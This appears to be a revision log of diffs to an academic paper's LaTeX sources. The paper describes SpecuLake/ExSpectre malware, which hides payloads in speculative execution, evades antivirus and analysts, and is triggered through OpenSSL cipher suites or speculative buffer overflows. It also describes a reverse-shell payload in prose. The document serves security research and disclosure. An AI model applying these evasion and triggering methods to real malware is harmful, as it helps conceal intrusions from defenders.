-programs that directly make syscalls or have the capability of making arbitrary
-syscalls. We note that this is the state of modern commercial anti-virus
-technology but does not mean that \speculake is undetectable.
+We verified that modern Anti-Virus technologies were unable to detect
+and flag \speculake malware. We used ClamAV, BitDefender and rkhunter, which
+mainly rely on signature- and string-based detection. BitDefender does feature
+support for unpacking or extracting malware, though appears to simply try
+unpacking using several known packers and encoding formats~\cite{BitDefender}.
+Thus, it is not surprising that these tools cannot detect
+\speculake.
 
@@
 To prevent such identification, analyzers often employ ``bare metal''
-execution~\cite{kirat2011barebox}, by running the malware on
+execution~\cite{kirat2011barebox}, running the malware on
 dedicated hardware that allows introspection and observation of the system
@@
 the speculative state of the CPU, making it difficult to analyze \speculake
-malware. Such environments would be useful for observing the behavior of
-\speculake malware in the presence of its trigger, but this presumably would not be
-present in such a context.
+malware. However, such environments could be useful for observing the behavior of
+\speculake malware in the presence of its trigger if available, as modifications
+in the real world could be easily tracked.
 
-Symbolic execution has been used to find
+%but this presumably would not be
+%present in such a context.
+
+Symbolic execution has also been used to find
 environmental red pill checks~\cite{schwartz2010all}. However, such analysis
@@
 \subsubsection{Reverse-engineering triggers}
-Once \speculake malware has been detected analysts attempting to
-reverse-engineer the effect of the malware can take a similar path as to its
-authors. Specifically the task of examining the real-world execution path of the
-malware and comparing this with the indirect and direct jumps conducted by
-potential trigger programs to find a match. We note that while there may be a
-large number of potential trigger programs the real world execution pathway must
-match the malware's very closely in order to influence the malware successfully.
-However this method will not be useful against the speculative store bypass
-version of \speculake, as a secondary trigger program is unnecessary there.
+For program-based triggers, an analyst could attempt to find the trigger program
+by examining the execution path of the payload program, and locating a common
+indirect jump pattern between payload and potential triggers. Since both programs must
+share a common indirect jump pattern to interact via the indirect branch
+predictor, there must be some overlap which is unlikely to occur randomly
+between two programs.
+
+We note that while the analyst may learn the execution path (and thus true
+indirect jump pattern) of the payload program, they may not be able to capture
+every potential execution path in all potential triggers. For example, in the
+OpenSSL trigger, the analyst may not have captured all potential indirect jump
+patterns, as doing so would require exhaustively connecting to OpenSSL with
+different cipher suites, extensions, and failed handshakes. However, the analyst
+can still make a list of indirect jump locations in a suspected trigger program,
+comparing these to the jumps taken by the payload. If there is significant
+overlap, the analyst could spend time to discover what inputs to the trigger
+program produce similar indirect jump patterns, thus discovering the trigger.
+
+\speculake malware could attempt to thwart this analysis by using decoy indirect
+jumps that do not correspond with the trigger, but potentially correspond with
+other (non-trigger) binaries. In addition, this analysis method is ineffective
+at inspecting the speculative buffer overflow variant described in
+Section~\ref{subsec:spec-buffer-overflow}, as it does not use a separate trigger
+program.
 
@@
 
-This work demonstrates a general model for hiding execution in 
+\speculake demonstrates a general model for hiding execution in 
 the speculative world and examines the implications and limitations on
-Intel processors. Given the wide-spread nature of the Spectre vulnerability 
+modern processors. Given the wide-spread nature of the Spectre vulnerability 
 and the ubiquity of side-channels, we believe that this work can 
-be directly extended to ARM and other processors making use of
+be directly extended to other architectures, such as ARM, and other processors
+making use of
 speculative branch prediction.
@@
 To create further difficulties for an analyst, or to further target the
-execution environment, it is possible to have the payload program test a series
-of separate jump patterns. Instead of requiring only a single trigger program,
+execution environment, it is possible to have the payload program to combine
+multiple triggers. Instead of requiring only a single trigger program,
 the payload could require multiple trigger programs to be running
-simultaneously, or in a particular order.
+simultaneously, or in a particular order. Alternatively, the payload could combine
+trigger programs with input triggers, forcing an analyst to understand multiple
+variants simulatenously.
 
@@
 Using this method a payload
-program can be distributed without the encrypted data section all together,
-instead having the data written into the process at run-time without ever
+program can be distributed without the encrypted data section at all,
+instead having the data written into the process indirectly at run-time without ever
 connecting out to any other resource.
@@
 
-\subsubsection{Hypervisors}
-For virtual environments that provide guests significant periods of access to
-hardware resources, \speculake is viable in certain configurations. 
-This result is specific to Spectre 2 variant, as it relies on 
-the indirect branch predictor effecting the branches in either the host 
-or guest environment. We have found that the hypercall context switch from 
-guest to host is light enough that a trigger program running in a guest
-can effect the branch predictor in a host on the same CPU core. This is not
-true in the opposite direction (where the trigger runs on the host) as the 
-hypercall transition seems to be more substantial. While this implies 
-that guest-to-guest indirect branch predictor interference, and the current
-\speculake implementation, will not work across disparate virtual environments,
-strict resource isolation gives a stronger guarantee of non-interference.
+\subsubsection{Virtual Machines}
+Virtual environments could also be host to \speculake malware and triggers. For
+instance, malware on one EC2 instance could potentially be triggered by a
+trigger program on another seemingly unrelated instance. We have found that the
+hypercall context switch from guest to host on VirtualBox is lightweight enough
+that a trigger program running in a guest can activate a payload program running
+in the host on the same CPU core. However, we have so far been unable to go in
+the opposite direction, and similarly have yet to achieve guest-to-guest
+interference. More work is needed to determine if such barriers are possible to
+overcome, and if stronger isolation is needed in the virtual machine context.
+
+%For virtual environments that provide guests significant periods of access to
+%hardware resources, \speculake is viable in certain configurations. 
+%This result is specific to Spectre 2 variant, as it relies on 
+%the indirect branch predictor effecting the branches in either the host 
+%or guest environment. We have found that the hypercall context switch from 
+%guest to host is light enough that a trigger program running in a guest
+%can effect the branch predictor in a host on the same CPU core. This is not
+%true in the opposite direction (where the trigger runs on the host) as the 
+%hypercall transition seems to be more substantial. While this implies 
+%that guest-to-guest indirect branch predictor interference, and the current
+%\speculake implementation, will not work across disparate virtual environments,
+%strict resource isolation gives a stronger guarantee of non-interference.
 
@@
 We have proposed the \speculake model as a new malware threat, however, this
-model of hidden computation applies more broadly. As of now there are no ways of
+model of hidden computation could be applied more broadly. As of now there are no ways of
 debugging speculative computation, meaning that the computation done there is
-effectively isolated and difficult to extract by third-parties. While not a true
-trusted execution environment, it could be used like one, offering potential
-uses in Digitial Rights Management (DRM), and whitebox cryptography.
+effectively isolated and difficult to extract by third-parties, even with
+physical or root access to the machine it operates on. While not a true
+trusted execution environment, it is possible that such an environment could be
+used as a limited trusted environment. This may have potential use in digital
+rights management (DRM), and whitebox cryptography applications.
 

### 2018-08-07 paper/architecture.tex
pass threat model

@@
 it. We note this is distinct from the goals of evading malware detection, where
-maleware escapes classification by an anti-virus or other automated tool. While
+malware escapes classification by an anti-virus or other automated tool. While
 we believe \speculake could also be used to make automated detection more
@@
 
-We assume the adversary is able to install binaries on the target machine
-(e.g. via a trojan or remote exploitation), and the analyst is attempting to
-determine what the malware will do using traditional debugging tools. We assume
-the analyst may be aware that speculative execution is used to obfuscate
-behavior, but does not have special-purpose hardware that allows introspection of
-the CPU's speculative state. This assumption is realistic, as modern processors
-do not allow developers or other users to directly interact with proprietary CPU
+We assume the adversary is able to install binaries on the target machine (e.g.
+via a trojan or remote exploitation), and the analyst is attempting to determine
+what the malware will do using traditional debugging tools. We assume the
+analyst may be aware that speculative execution is used to obfuscate behavior,
+but does not have special-purpose hardware that allows introspection of the
+CPU's speculative state. This assumption is realistic, as modern processors do
+not allow developers or other users to directly interact with proprietary CPU
 optimizations and features.
@@
 We further assume that the malware has a specific trigger that the analyst is
-not privy to. In our examples, this trigger is often behavior exhibited by some
-other (potentially benign) process running on the same system as the malware.
-As the adversary is able to control when such a trigger is deployed (potentially
-remotely), the analyst will not be able to observe or force this trigger to
-happen at will. We emphasize that while this may also be true for existing
-trigger-based malware, analysts can often reverse engineer the trigger out of
-the malware, for example by observing control flow within the malware and using
-adaptive fuzzers~\cite{afl,stephens2016driller} to generate inputs that explore other execution
-paths of the binary. In contrast, \speculake malware's trigger depends on
-behavior in seemingly unrelated binaries, influencing malware behavior through
-channels that are effectively invisible to the analyst. As with typical malware, the analyst may
-attempt to reverse engineer the trigger to reveal the malware's behavior, but we
-will show (in Section~\ref{subsec:nested-spec}) how to defeat this type of
-analysis.
+not privy to, and the adversary can influence. In our examples, this
+trigger is often behavior exhibited by some other (potentially benign) process
+running on the same system as the malware. As the adversary is able to control
+when such a trigger is deployed (potentially remotely), the analyst will not be
+able to observe or force this trigger to happen at will. We emphasize that while
+this may also be true for existing trigger-based malware, analysts can often
+reverse engineer the trigger out of the malware, for example by observing
+control flow within the malware and using adaptive
+fuzzers~\cite{afl,stephens2016driller} to generate inputs that explore other
+execution paths of the binary. In contrast, \speculake malware's trigger depends
+on behavior in seemingly unrelated binaries, influencing malware behavior
+through channels that are effectively invisible to the analyst. As with typical
+malware, the analyst may attempt to reverse engineer the trigger to reveal the
+malware's behavior, but we will show (in Section~\ref{subsec:nested-spec}) how
+to defeat this type of analysis.
 

### 2018-08-07 paper/figures.tex
update caption
added implementation section for spectre 1.1

@@
     in cache avgeraged over 20,000 trials). We find that a branch must be trained in a
-    direction at least 200 times before it can start to be used in a speculative buffer overflow.}
+    direction at least 400 times before it can start to be used in a speculative buffer overflow.}
     \label{fig:spectre-one}
+\end{figure}
+}
+
+\newcommand{\FigSpectreOneModel}{
+\begin{figure}[ht]
+    \centering
+    \includegraphics[width=0.9\linewidth]{figures/spectre_1_model.png}
+    \caption{\textbf{Speculative Buffer Overflow}\,---\, %
+    Safe input values are stored into a local array (Step 1),
+    training the branch predictor to bypass the bounds check when given
+    unsafe input (Step 2). This results in a speculative array store which
+    overflows the bounds and overwrite a return address (Step 3). The CPU's 
+    store-to-load forwarding will forward the speculative overflow to the 
+    return (Step 4), where it will steer speculative execution to the 
+    attacker-specified speculative entry point (Step 5). Eventually, the 
+    original bounds check is resolved and control flow is redirected to the 
+    cache timing function (Step 6). }
+    \label{fig:spectre-one-model}
 \end{figure}

### 2018-08-07 paper/implementation.tex
added implementation section for spectre 1.1

@@
 
-\subsection{Virtual Machine}
+\subsection{Emulator}
 \label{subsec:spasm}
@@
 
+\subsection{Speculative Buffer Overflow Trigger}
+\label{subsec:openssl-impl}
+
+\FigSpectreOne
+
+To demonstrate the adaptability of this attack we have implemented the 
+Speculative Buffer Overflow alternative trigger and assembled an \speculake 
+payload.
+
+We make use of text input as the trigger to the payload program in this case,
+where an input file contains entries specifying length, padding length,
+and data value. When a line is read the payload program makes a bounds
+check on the length of padding then stores the data at that offset in a
+local array.
+
+The local array store is now the vulnerability it can be exploited even 
+with complete bounds checks. After a series of honest inputs we include 
+an entry with a padding length beyond the maximum. On the runs with this
+cafted input we flush from cache the maximum padding length constant in 
+the payload program, preventing the bounds check from being resolved 
+and allowing the data value to be speculatively stored. We 
+then speculatively overwrite the return address and use store-to-load forwarding
+to cause a following return to divert to the address specified by the data entry. 
+From here we make use of the decryption gadget to dcecrypt SPASM instructions
+from an encrypted data blob to be transmitted to the real world via cache 
+side-channel. Using this method we have been able to run all SPASM payloads 
+including the reverse-shell.
+
+We note significant unpredictability in the branch predictor, though we
+show in Figure~\ref{fig:spectre-one} that a minimum around 200 safe input entries
+to each dishonest entry are required before a distinguishable signal is present 
+in the cache channel.
+
 %%%%%%%%%%%%%%

### 2018-08-07 paper/triggers.tex
add paragraph about trigger inputs to intro
added implementation section for spectre 1.1
fix citation

@@
 So far, we have described using a custom program as a trigger, which performs a
-pattern of indirect jumps to mistrain the indirect branch predictor, leading the payload program
-to its speculative entry point. In this
-section, we describe alternative triggers, including using benign programs
-already on the system, and recent Spectre variants.
+pattern of indirect jumps to mistrain the indirect branch predictor, leading the
+payload program to its speculative entry point. In this section, we describe
+alternative triggers, including using benign programs already on the system, and
+recent Spectre variants.
 
@@
 
-For example, if a benign application makes a series of indirect jumps---thus training
-the indirect branch predictor---an ExSpectre payload can make similar indirect
-jumps leading up to its speculative entry point. The payload's speculative entry
-point will be determined by the benign application, but may be even more
-difficult for an analyst to discover, as now the ExSpectre trigger could be
-\emph{any} application running concurrently on the system.
+For example, if a benign application makes a series of indirect jumps---thus
+training the indirect branch predictor---an ExSpectre payload can make similar
+indirect jumps leading up to its speculative entry point. The payload's
+speculative entry point will be determined by the benign application, but may be
+even more difficult for an analyst to discover, as now the ExSpectre trigger
+could be \emph{any} application running concurrently on the system.
 
@@
 \emph{communicate} information covertly to the malicious payload program. For
-example, with OpenSSL, the attacker could have a pair of uncommon cipher
-suites, where using one results in communicating a 1-bit, while use of the other
+example, with OpenSSL, the attacker could have a pair of uncommon cipher suites,
+where using one results in communicating a 1-bit, while use of the other
 communicates a 0-bit to the payload. To receive data, the payload would have to
-do indirect jump patterns corresponding to OpenSSL code for processing both cipher suites, with the
-corresponding speculative entry points shifting in the appropriate bit. Thus, an
-adversary can communicate remotely (over a network) to the payload program
-indirectly via a benign application.
+do indirect jump patterns corresponding to OpenSSL code for processing both
+cipher suites, with the corresponding speculative entry points shifting in the
+appropriate bit. Thus, an adversary can communicate remotely (over a network) to
+the payload program indirectly via a benign application.
 
-We observe that communication could also go in the other direction: from
-the payload program back to the remote adversary, also via the benign application
+We observe that communication could also go in the other direction: from the
+payload program back to the remote adversary, also via the benign application
 intermediary. The payload program could influence the performance of the benign
 application, and the adversary could time responses from the benign application
-to receive covert information from the malicious payload~\cite{netspectre}. This would allow the
-malicious payload to operate \emph{entirely speculatively}, without assistance
-from the real world for keeping state.
+to receive covert information from the malicious
+payload~\cite{schwarz2018netspectre}. This would allow the malicious payload to
+operate \emph{entirely speculatively}, without assistance from the real world
+for keeping state.
 
@@
 \subsection{Speculative Buffer Overflow}
-
-\FigSpectreOne
+\label{subsec:spec-buffer-overflow}
 
@@
 While existing fuzzers and symbolic execution tools can discover traditional
-input triggers, we can leverage other Spectre variants to obfuscate our triggers.
+input triggers, we can leverage other Spectre variants to obfuscate our
+triggers.
 
-To do this, we use Specualtive Buffer Overflows (SBO)~\cite{kiriansky2018speculative}
-to redirect control flow
-to a speculative entry point specified by user input.
-We design a payload program that takes arbitrary user input and performs appropriate
-bounds checks to ensure no traditional control flow violations could be exploited.
-However, using the Spectre~1.1 variant, control flow can still be violated speculatively,
-allowing the adversary to force a speculative entry point based entirely off the
-input provided. This allows the trigger to be an input, potentially even
-provided over a network if the payload program accepts network data. Traditional
-symbolic execution and code coverage fuzzers will be unable to discover this trigger input, as
-they do not model the speculative state of the CPU.
+To do this, we use Specualtive Buffer Overflows
+(SBO)~\cite{kiriansky2018speculative} to redirect control flow to a speculative
+entry point specified by user input. We design a payload program that takes
+arbitrary user input and performs appropriate bounds checks to ensure no
+traditional control flow violations could be exploited. However, using the
+Spectre~1.1 variant, control flow can still be violated speculatively, allowing
+the adversary to force a speculative entry point based entirely off the input
+provided. This allows the trigger to be an input, potentially even provided over
+a network if the payload program accepts network data. Traditional symbolic
+execution and code coverage fuzzers will be unable to discover this trigger
+input, as they do not model the speculative state of the CPU.
 
@@
 
-We make use of this pattern in a willing payload such that user input can intentionally
-mistrain the branch predictor by repeatedly sending valid (in-bounds) values of
-\texttt{y} before sending a value that would overflow the bounds of \texttt{c}.
-The speculative entry point is also chosen by the 
-trigger in this scenario as \texttt{z} contains the address of the 
-speculative entry point, allowing the attacker to create a ROP-style speculative 
-execution path through the payload. We describe our implementation of this in
-Section~\ref{tk}.
+We make use of this pattern in a willing payload such that user input can
+intentionally mistrain the branch predictor by repeatedly sending valid
+(in-bounds) values of \texttt{y} before sending a value that would overflow the
+bounds of \texttt{c}. The speculative entry point is also chosen by the trigger
+in this scenario as \texttt{z} contains the address of the speculative entry
+point, allowing the attacker to create a ROP-style speculative execution path
+through the payload. We describe our implementation of this in Section~\ref{tk}.
 

### 2018-08-07 paper/triggers.tex
comment out sbo impl for now

--- 2018-08-06 paper/triggers.tex
@@
 speculative entry point, allowing the attacker to create a ROP-style speculative 
-execution path through the payload. We describe our implementation of this in
-Section~\ref{tk}.
+execution path through the payload.
+%We describe our implementation of this in Section~\ref{tk}.
+
+% If it gets implemented, remove this, add that ^^^
+\FigSpectreOne
+We implemented an experiment to determine the number of times a branch needs to
+be ``trained'' before it can be used as a speculative buffer overflow.
+Figure~\ref{fig:spectre-one} shows that several hundred benign inputs are needed
+to reliably be able to observe speculative buffer overflow behavior.
 

### 2018-08-07 paper/triggers.tex
fix bad ref

@@
 as seen from Kiriansky and Waldspurger's Spectre~1.1
-description~\cite{kiransky2018speculative}:
+description~\cite{kiriansky2018speculative}:
 \begin{lstlisting}

### 2018-08-07 paper/figures.tex
figures.tex
figure fixes

@@
     in cache avgeraged over 20,000 trials). We find that a branch must be trained in a
-    direction at least 400 times before it can start to be used in a speculative buffer overflow.}
+    direction hundreds of times before it can start to be used in a speculative buffer overflow.}
     \label{fig:spectre-one}
@@
     after an increasing number of instructions, and measured the fraction of times the load
-    was subsequently in cache. We find that we can execute up to 220 instructions speculatively,
-    which corresponds with the size of the CPU's reorder buffer (ROB). However, more complex instructions
+    was subsequently in cache. However, more complex instructions
     have stricter constraints, generally corresponding to the number of $\mu$-ops that an instruction
-    comprises.}
+    comprises. We find that we can execute up to 220 instructions 
+    speculatively, which corresponds with the size of the CPU's reorder buffer (ROB). We measure 
+    the ROB size by timing two cache accesses with a variable number of 
+    instructions between them. The step in cycles around 220 instructions indicates that the 
+    second cache access was pushed out of the ROB defining an upper limit on size.  }
     \label{fig:spec-capacity-np}

### 2018-08-07 paper/figures.tex
update captions and clarifications to implementation

@@
     \includegraphics[width=0.9\linewidth]{figures/spectre_1_training.png}
-    \caption{\textbf{Speculative buffer overflow warm-up}\,---\, %
+    \caption{\textbf{Speculative buffer overflow warm-up}\,---\,%
     The direct branch predictor must
@@
     \includegraphics[width=0.9\linewidth]{figures/spectre_1_model.png}
-    \caption{\textbf{Speculative Buffer Overflow}\,---\, %
+    \caption{\textbf{Speculative Buffer Overflow}\,---\,%
     Safe input values are stored into a local array (Step 1),
@@
         \includegraphics[width=0.9\textwidth]{figures/Speculative_measurements_no-parity.png}
-        \caption{\textbf{Speculative limits}\,---\, %
+        \caption{\textbf{Speculative limits}\,---\,%
     To find the number of instructions we can execute speculatively, we placed a speculative load
@@
         \includegraphics[width=1.05\linewidth]{figures/Speculative_measurements_parity.png}
-        \caption{\textbf{Hyperthreading}\,---\, %
+        \caption{\textbf{Hyperthreading}\,---\,%
         The trigger program influences the payload program via the indirect branch predictor
@@
         \includegraphics[width=0.4\textwidth]{figures/general_model.pdf}
-        \caption{\textbf{ExSpectre model}\,---\, %
+        \caption{\textbf{ExSpectre model}\,---\,%
         General model of speculative computation within the payload 
@@
         \includegraphics[width=0.5\textwidth]{figures/Speculative_bandwidth}
-        \caption{\textbf{Speculative Bandwidth}\,---\, %
+        \caption{\textbf{Speculative Bandwidth}\,---\,%
         Using the speculative primitive, 1KB of data
@@
         \includegraphics[width=0.46\textwidth]{figures/spasm_model.pdf}
-        \caption{\textbf{SPASM model}\,---\, %
+        \caption{\textbf{SPASM model}\,---\,%
         Our SPASM emulator speculatively decrypts intructions, and emulates

### 2018-08-07 paper/implementation.tex
comment out sbo impl for now
update captions and clarifications to implementation

@@
 
-This error is particularly devious, as it is not an
-error of bit flips or noise, but rather the processor speculating what the
-speculative gadget will read from memory. Thus, error correcting codes on
-the reported result do not improve the situation.
+This error is particularly devious, as it is not an error of bit flips or noise,
+but rather the processor speculating what the speculative gadget will read from
+memory. Thus, error correcting codes on the reported result do not improve the
+situation.
 
-Instead, we
-repeat the execution several times and look for the modal value over all
-iterations. We measured the
-error rate of our implementation as a function of how many redundant iterations
-of the same step, and found that 10 redundant iterations resulted in 1 error every
-million Turing steps, with the error rate dropping exponentially as iterations
-increase. We choose 11 iterations as a conservative bound (error rate measured
-to be 0), and computed 1 million Turing steps at a rate of 1351
-steps per second.
+Instead, we repeat the execution several times and look for the modal value over
+all iterations. We measured the error rate of our implementation as a function
+of how many redundant iterations of the same step, and found that 10 redundant
+iterations resulted in 1 error every million Turing steps, with the error rate
+dropping exponentially as iterations increase. We choose 11 iterations as a
+conservative bound (error rate measured to be 0), and computed 1 million Turing
+steps at a rate of 1351 steps per second.
 
@@
 The speculative world is able to take advantage of the AES-NI instructions to
-decrypt messages. However, the speculative upper-limit of about 175 $\mu$~ops is not
-enough to allow us to compute the key expansion, even using the
+decrypt messages. However, the speculative upper-limit of about 175 $\mu$~ops is
+not enough to allow us to compute the key expansion, even using the
 \texttt{aeskeygenassist} instructions. To avoid this, we can either preload the
 expanded key schedule into the program (instead of the key), or use a cheaper
-(non-standard) key expansion algorithm.
-For the former, we note that an analyst
-could observe the structure of a normal key schedule,
-but we can avoid this by simply selecting 11 random round keys.
-We note that
-this should not weaken the security of AES, as we can ensure the round keys are
-not linearly related.
+(non-standard) key expansion algorithm. For the former, we note that an analyst
+could observe the structure of a normal key schedule, but we can avoid this by
+simply selecting 11 random round keys. We note that this should not weaken the
+security of AES, as we can ensure the round keys are not linearly related.
 
@@
 channel requires reading $2^{12}$ locations. On the other hand, there is a fixed
-overhead per speculative iteration that favors increased channel width to maximize
-bandwidth. As shown in Figure~\ref{fig:spec_bandwidth}, 8 bits is the optimal
-side channel width, allowing us to decrypt over 5,000 bits per second (625
-Bytes/sec).
+overhead per speculative iteration that favors increased channel width to
+maximize bandwidth. As shown in Figure~\ref{fig:spec_bandwidth}, 8 bits is the
+optimal side channel width, allowing us to decrypt over 5,000 bits per second
+(625 Bytes/sec).
 % Iterations: 20
@@
 We also implemented our nested speculation technique for obfuscating keys,
-making 256 speculative landing spots that each
-shift 8 unique bits into the 128-bit register \texttt{\%xmm0}, and then
-performing an indirect jump. We then had a custom trigger program perform 16
-indirect jumps (after the initial 28) that corresponded with 16 randomly-chosen landing spots in the
-payload program, training the branch predictor. When the payload program reaches the
-first speculative jump, it follows the same pattern speculatively, 
-eventually filling
-\texttt{\%xmm0} with the corresponding $16*8$ bits. We then used
-the \texttt{aesenc} instruction to expand these 128-bits to a full
-key schedule, and performed decryption as described previously. Thus, without
-the trigger program, an analyst has no information about what key is used to
-decrypt the ciphertext in the payload.
+making 256 speculative landing spots that each shift 8 unique bits into the
+128-bit register \texttt{\%xmm0}, and then performing an indirect jump. We then
+had a custom trigger program perform 16 indirect jumps (after the initial 28)
+that corresponded with 16 randomly-chosen landing spots in the payload program,
+training the branch predictor. When the payload program reaches the first
+speculative jump, it follows the same pattern speculatively, eventually filling
+\texttt{\%xmm0} with the corresponding $16*8$ bits. We then used the
+\texttt{aesenc} instruction to expand these 128-bits to a full key schedule, and
+performed decryption as described previously. Thus, without the trigger program,
+an analyst has no information about what key is used to decrypt the ciphertext
+in the payload.
 
@@
 We have implemented our custom instruction set architecture---SPASM---as a model
-using two pseudo-registers, and
-6-bit instruction length which allows for a relatively direct programming model
-in which structured values can be entered into memory locations before making
-a systemcall.
+using two pseudo-registers, and 6-bit instruction length which allows for a
+relatively direct programming model in which structured values can be entered
+into memory locations before making a systemcall.
 
@@
 
-In this model of computation there are effectively no instruction arguments, as we must
-return an entire instruction from the speculative world inside the limited-width
-cache side channel. Although other small
-instruction sets exist, they either allow variable instruction
-lengths, are too long even in reduced form, or did not have significant support
-to make them favorable for developers.
+In this model of computation there are effectively no instruction arguments, as
+we must return an entire instruction from the speculative world inside the
+limited-width cache side channel. Although other small instruction sets exist,
+they either allow variable instruction lengths, are too long even in reduced
+form, or did not have significant support to make them favorable for developers.
 
-We used 6 bits in the construction of this instruction set as our
-goal is to limit the length of each opcode as much as possible. Note that this
-is different from the goal in maximizing bandwidth, as our goal now is to
-maximize instruction throughput. Given our short instructions, loading values into registers
-requires shifting in 4-bits at a time. SPASM has two registers that act as a
-pointer and working register, that can be used to perform jumps, arbitrary
-memory reads and writes, and basic arithmatic. We also have a \texttt{syscall}
-instruction that makes a real system call to the underlying operating system
-with parameters loaded from the SPASM state, allowing us to interact with the
-real world. Details of
-the SPASM instruction set can be found in Appendix~\ref{appendix:spasm}.
+We used 6 bits in the construction of this instruction set as our goal is to
+limit the length of each opcode as much as possible. Note that this is different
+from the goal in maximizing bandwidth, as our goal now is to maximize
+instruction throughput. Given our short instructions, loading values into
+registers requires shifting in 4-bits at a time. SPASM has two registers that
+act as a pointer and working register, that can be used to perform jumps,
+arbitrary memory reads and writes, and basic arithmetic. We also have a
+\texttt{syscall} instruction that makes a real system call to the underlying
+operating system with parameters loaded from the SPASM state, allowing us to
+interact with the real world. Details of the SPASM instruction set can be found
+in Appendix~\ref{appendix:spasm}.
 
@@
 loaded into a \speculake payload, which decrypts and emulates SPASM instructions
-only when the corresponding trigger program is running.
-We have implemented a \textit{HelloWorld}
-program that prints to \texttt{stdout}, and a \texttt{FizzBuzz} program that
-demonstrates control flow and arithmetic operations while printing to stdout.
-Finally, we implemented a \textit{ReverseShell} program that opens and connects a TCP socket
-to an attacker-chosen location
-before executing a local shell and allowing the remote adversary
-to issue shell commands on the victim machine.
+only when the corresponding trigger program is running. We have implemented a
+\textit{HelloWorld} program that prints to \texttt{stdout}, and a
+\textit{FizzBuzz} program that demonstrates control flow and arithmetic
+operations while printing to stdout. Finally, we implemented a
+\textit{ReverseShell} program that opens and connects a TCP socket to an
+attacker-chosen location before executing a local shell and allowing the remote
+adversary to issue shell commands on the victim machine.
 Figure~\ref{fig:spasm_model} details the high-level flow of a SPASM payload.
@@
 
-Our \textit{ReverseShell} program consists of 355 SPASM instructions, and
-makes six system calls to open a socket,
-connect to it, duplicate I/O file descriptors, and perform an \texttt{execve}
-system call to open a shell.
-In our tests using 5 iterations per decrypted instruction, the
-\textit{ReverseShell} program takes just over 2ms to launch a reverse shell
-once triggered.
+Our \textit{ReverseShell} program consists of 355 SPASM instructions, and makes
+six system calls to open a socket, connect to it, duplicate I/O file
+descriptors, and perform an \texttt{execve} system call to open a shell. In our
+tests using 5 iterations per decrypted instruction, the \textit{ReverseShell}
+program takes just over 2ms to launch a reverse shell once triggered.
 
@@
 
-To demonstrate a benign trigger application, we implemented an ExSpectre payload that
-would trigger when running concurrently with OpenSSL.
+To demonstrate a benign trigger application, we implemented an ExSpectre payload
+that would trigger when running concurrently with OpenSSL.
 % Could cut?
-We disable
-ASLR for simplification, but note that
-branch predictors can also be used to determine ASLR offsets of co-resident applications,
-and our attack adjusted accordingly~\cite{evtyushkin2016jump}.
+We disable ASLR for simplification, but note that branch predictors can also be
+used to determine ASLR offsets of co-resident applications, and our attack
+adjusted accordingly~\cite{evtyushkin2016jump}.
 
@@
 and printed out every instruction executed and its address after a breakpoint on
-the \texttt{SSL\_new} function. We then made a TLS connection to the
-server,
+the \texttt{SSL\_new} function. We then made a TLS connection to the server,
 which produced over 13~million instructions, including over 359,000 direct jumps
-and 28,000 indirect jumps. We then searched for the longest repeated set of more than
-28 indirect jumps that ends with a unique jump (i.e. source and destination do
-not occur in the previous 28+ indirect jumps).
+and 28,000 indirect jumps. We then searched for the longest repeated set of more
+than 28 indirect jumps that ends with a unique jump (i.e. source and destination
+do not occur in the previous 28+ indirect jumps).
 
@@
 the ECDHE shared secret. We made a list of 31 source-destination address pairs
-for these indirect jumps, and constructed a jump/ret chain to mimic the same
-jump pattern in
-our payload program. Our payload program mimicks the first 30 indirect jump
-source/destination pairs, with a final jump going to a cache timing function
-in our payload program. However, due to the prior pattern, this last jump is
-frequently mis-speculated (about 3.5\% of the time), and instead goes to the
-destination corresponding to the 31st jump in OpenSSL, which serves as our
-speculative entry point.
+for these indirect jumps, and constructed a \texttt{jump}/\texttt{ret} chain to
+mimic the same jump pattern in our payload program. Our payload program mimics
+the first 30 indirect jump source/destination pairs, with a final jump going to
+a cache timing function in our payload program. However, due to the prior
+pattern, this last jump is frequently mis-speculated (about 3.5\% of the time),
+and instead goes to the destination corresponding to the 31st jump in OpenSSL,
+which serves as our speculative entry point.
 
@@
 
-We ran experiments on an Intel Haswell
-i5-4590 CPU, with OpenSSL and our payload program pinned to the same core using
-\texttt{taskset}.
-We induced the jump pattern in OpenSSL by running Apache benchmark against it to
-generate thousands of TLS connections using the ECDHE key exchange with the
-secp256r1 curve (ECDHE-RSA-AES256-GCM-SHA384). When running Apache benchmark locally, our payload program
-reliably executes (speculatively) at the intended speculative entry point
-about 3.5\% of the time. When apache benchmark runs on a remote
+We ran experiments on an Intel Haswell i5-4590 CPU, with OpenSSL and our payload
+program pinned to the same core using \texttt{taskset}. We induced the jump
+pattern in OpenSSL by running Apache benchmark against it to generate thousands
+of TLS connections using the ECDHE key exchange with the secp256r1 curve
+(ECDHE-RSA-AES256-GCM-SHA384). When running Apache benchmark locally, our
+payload program reliably executes (speculatively) at the intended speculative
+entry point about 3.5\% of the time. When apache benchmark runs on a remote
 machine, this rate drops to approximately 2.0\%. Nonetheless, these are both
@@
 We verified that our payload program did not execute at the speculative entry
-point when we ran
-other programs that simply consumed CPU on the same core. In addition, when we used
-Apache benchmark to create thousands of connections with a different cipher
-suite (DHE-RSA-AES128-GCM-SHA256), we similarly saw no speculation at the entry point. This
-could allow an adversary to use an obscure or uncommon cipher suite to trigger a
-malicious \speculake payload program on a remote server.
+point when we ran other programs that simply consumed CPU on the same core. In
+addition, when we used Apache benchmark to create thousands of connections with
+a different cipher suite (DHE-RSA-AES128-GCM-SHA256), we similarly saw no
+speculation at the entry point. This could allow an adversary to use an obscure
+or uncommon cipher suite to trigger a malicious \speculake payload program on a
+remote server.
 
+%\FigSpectreOne
+
+\if0
 \subsection{Speculative Buffer Overflow Trigger}
-\label{subsec:openssl-impl}
-
-\FigSpectreOne
+\label{subsec:sbo-impl}
 
@@
 in the cache channel. 
-
+\fi
 %%%%%%%%%%%%%%

### 2018-08-07 paper/discussion.tex
minor changes

@@
 
-\paragraph{Indirect Branch Predictor Barrier} - IBPB is used when transitioning to a new
-address space, allowing a
-program to ensure that earlier code's behavior does not effect its branch prediction.
-IBPB requires CPU and operating system support. However, we observe on Linux that
-processes running under the same user group do not receive IBPB protection,
-enabling \speculake when the trigger and payload run under the same group.
-Furthermore, IBPB does not prevent the speculative buffer overflow variant of
-\speculake described in Section~\ref{subsec:spec-buffer-overflow}.
+\paragraph{Indirect Branch Predictor Barrier}IBPB is used when transitioning to
+a new address space, allowing a program to ensure that earlier code's behavior
+does not effect its branch prediction. IBPB requires CPU and operating system
+support. However, we observe on Linux that processes running under the same user
+group do not receive IBPB protection, enabling \speculake when the trigger and
+payload run under the same group. Furthermore, IBPB does not prevent the
+speculative buffer overflow variant of \speculake described in
